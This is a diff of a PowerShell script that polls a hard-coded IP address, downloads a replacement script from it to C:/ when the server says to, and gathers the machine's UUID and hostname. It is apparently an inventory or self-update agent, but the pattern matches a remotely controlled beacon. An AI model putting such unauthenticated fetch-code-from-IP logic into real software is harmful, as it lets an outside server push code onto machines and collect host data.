@@ -1,4 +1,5 @@
-$req = [System.Net.WebRequest]::Create("http://103.62.153.74:53000/computer_detail/update_status.php")
+# check if we update code and if we get computer detail
+$req = [System.Net.WebRequest]::Create("http://103.62.153.74:53000/computer_detail/get_update_latest.php")
 $resp = $req.GetResponse()
 $reqstream = $resp.GetResponseStream()
 $stream = new-object System.IO.StreamReader $reqstream
@@ -20,7 +21,13 @@ function ConvertFrom-Json([object] $item){
     return ,$ps_js.DeserializeObject($item)
 }
 
-if($obj.update -eq $true){
+# update code script
+if($obj.update_code -eq 1){
+    (new-object System.Net.WebClient).DownloadFile('http://103.62.153.74:53000/computer_detail/script_win7.ps1','C:/script_win7.ps1')
+}
+
+# get computer detail
+if($obj.status -eq 1){
     $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
 
     $hostname = $env:COMPUTERNAME
